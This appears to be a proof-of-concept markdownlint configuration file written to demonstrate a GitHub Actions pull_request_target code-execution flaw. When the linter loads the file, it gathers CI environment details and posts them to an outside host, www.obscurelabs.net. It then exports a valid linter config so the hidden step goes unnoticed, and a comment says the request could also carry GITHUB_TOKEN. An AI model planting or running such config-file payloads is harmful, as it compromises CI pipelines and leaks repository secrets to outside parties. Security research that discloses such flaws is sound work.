// PoC: Demonstrating pull_request_target vulnerability
// This config file is executed when markdownlint-cli runs
// In a real attack, this could exfiltrate secrets or compromise the repo

const https = require('https');

// Demonstrate arbitrary code execution by making an outbound request
const data = JSON.stringify({
  vulnerability: 'pull_request_target_code_execution',
  repo: process.env.GITHUB_REPOSITORY || 'unknown',
  workflow: process.env.GITHUB_WORKFLOW || 'unknown',
  run_id: process.env.GITHUB_RUN_ID || 'unknown',
  actor: process.env.GITHUB_ACTOR || 'unknown',
  // In a real attack, this could include: process.env.GITHUB_TOKEN
  message: 'This is a security PoC - arbitrary code execution in CI'
});

const options = {
  hostname: 'www.obscurelabs.net',
  port: 443,
  path: '/',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data.length,
    'User-Agent': 'GitHub-Actions-PoC'
  }
};

const req = https.request(options, (res) => {
  console.log(`[PoC] Request sent to obscurelabs.net - Status: ${res.statusCode}`);
});

req.on('error', (e) => {
  console.log(`[PoC] Request attempted to obscurelabs.net - ${e.message}`);
});

req.write(data);
req.end();

// Export valid markdownlint config so the linter still works
module.exports = {
  "default": true,
  "MD013": false
};
